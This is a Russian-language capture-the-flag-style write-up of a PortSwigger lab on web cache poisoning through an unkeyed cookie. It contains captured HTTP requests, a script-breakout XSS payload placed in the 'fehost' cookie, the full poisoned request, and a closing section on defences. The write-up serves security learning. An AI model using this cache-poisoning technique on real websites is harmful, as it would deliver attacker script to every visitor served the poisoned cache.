
некоторые сайты через куки параметр сохраняют в кеш версию языка страницы
```http
GET /blog/post.php?mobile=1 HTTP/1.1 
Host: innocent-website.com 
User-Agent: Mozilla/5.0 Firefox/57.0 
Cookie: language=ru;  👈
Connection: close
```

-------

лаба https://portswigger.net/web-security/web-cache-poisoning/exploiting-design-flaws/lab-web-cache-poisoning-with-an-unkeyed-cookie
##### Web cache poisoning with an unkeyed cookie

задание : отравить веб кеш так, чтобы все юзеры посещающие его после атаки (с учетом времени жизни ключа) - получили в своем браузере -  `   alert(1)   `

--------

вот ориг запрос к главной стр
```http
GET / HTTP/1.1
Host: 0a4300aa038140f8802844e2005300eb.web-security-academy.net
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i
Connection: keep-alive


```

вот первичный ответ
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: session=FdfJCXigi7fzbfL92ICAPTn6g4WzJ6Hl; Secure; HttpOnly; SameSite=None
Set-Cookie: fehost=prod-cache-01; Secure; HttpOnly
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 10946

```

вот повторный ответ - уже из кеша
кеш живет 30 сек
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 5
X-Cache: hit
Content-Length: 10946

```

--------
пробую найти отражение в html
```c
Cookie: language=ru;  - нет
X-Forwarded-Host: 444  - нет
X-Host: 444 - нет
Accept-Language: ru-RU,ru;q=0.9 -нет
X-Forwarded-Scheme: nothttps - нет

```


но все проще видимо - нашел запрос такой
```http
GET / HTTP/2
Host: 0a4300aa038140f8802844e2005300eb.web-security-academy.net
Cookie: session=FdfJCXigi7fzbfL92ICAPTn6g4WzJ6Hl; fehost=prod-cache-777
Cache-Control: max-age=0
```

и в ответе есть  и в заголовках и в самом html мой пейлоад 777
```http
HTTP/2 200 OK
Content-Type: text/html; charset=utf-8
Set-Cookie: fehost=prod-cache-01; Secure; HttpOnly
X-Frame-Options: SAMEORIGIN
Cache-Control: max-age=30
Age: 0
X-Cache: miss
Content-Length: 10947

<!DOCTYPE html>
<html>
<!--LAB_HEAD_START-->
    <head>
        <link href=/resources/labheader/css/academyLabHeader.css rel=stylesheet>
        <link href=/resources/css/labsEcommerce.css rel=stylesheet>
        <script>
            data = {"host":"0a4300aa038140f8802844e2005300eb.web-security-academy.net","path":"/","frontend":"prod-cache-777"}
        </script>
```

![[Снимок экрана 2026-03-24 в 11.44.34.png]]

-----

ну и самое веселое - то что в ответе тоже есть теперь 777 (в течении 30 сек) на обычный запрос без 777

![[Снимок экрана 2026-03-24 в 11.46.54.png]]

все что нужно сделать - это выйти из контекcта
```html
       <script>
            data = {"host":"0a4300aa038140f8802844e2005300eb.web-security-academy.net","path":"/","frontend":"prod-cache-777"}
        </script>
```

за 1 сек делаю пейлоад
```js
"}</script>hack<script>alert(1)</script><script>HACK
```

и вуаля - обошел
![[Снимок экрана 2026-03-24 в 11.50.10.png]]

сделал отравленный запрос в репитере
```http
GET / HTTP/2
Host: 0a4300aa038140f8802844e2005300eb.web-security-academy.net
Cookie: session=FdfJCXigi7fzbfL92ICAPTn6g4WzJ6Hl; fehost="}</script>hack<script>alert(1)</script><script>HACK
Cache-Control: max-age=0
Sec-Ch-Ua: "Chromium";v="145", "Not:A-Brand";v="99"
Sec-Ch-Ua-Mobile: ?0
Sec-Ch-Ua-Platform: "macOS"
Accept-Language: ru-RU,ru;q=0.9
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/145.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: navigate
Sec-Fetch-User: ?1
Sec-Fetch-Dest: document
Referer: https://portswigger.net/
Accept-Encoding: gzip, deflate, br
Priority: u=0, i


```

и потом через браузер открыл главную стр - и получил алерт!
лаба решена! все юзеры, кто заходит на эту стр - получают мой скрипт!
![[Снимок экрана 2026-03-24 в 11.52.49.png]]

--------

### ключевые моменты

1. обнаружил, что кука `fehost` отражается в `javascript`-объекте на странице без экранирования
    
2. проверил поведение кеша через `x-cache: hit/miss` и `cache-control: max-age=30`, убедился что ответы кешируются
    
3. выяснил, что значение куки `fehost` сохраняется в кеш вместе с ответом и отдается другим пользователям
    
4. сформировал пейлоад, который закрывает javascript-объект и открывает новый тег script с alert: `"}</script>hack<script>alert(1)</script><script>HACK`
    
5. отправил запрос с этим пейлоадом в куке `fehost`, дождался что ответ закешировался, и при обычном заходе на главную страницу получил `alert`
    
6. все пользователи, которые заходили на сайт в течение 30 секунд после отравления, получали выполнение моего скрипта
   

### защита

не использовать значения кук для генерации динамического контента, особенно внутри script-блоков

если кука нужна для работы приложения, экранировать все спецсимволы перед вставкой в html или javascript-контекст

убедиться, что куки, влияющие на ответ, включены в кеш-ключ или явно указаны в vary

настроить приложение так, чтобы ответы, содержащие пользовательские данные, не кешировались

если кеширование необходимо, использовать `cache-control: private` для ответов, которые зависят от кук пользователя

проверять, что после удаления вредоносной куки из запроса, ответ возвращается к исходному состоянию, а не продолжает отдаваться из кеша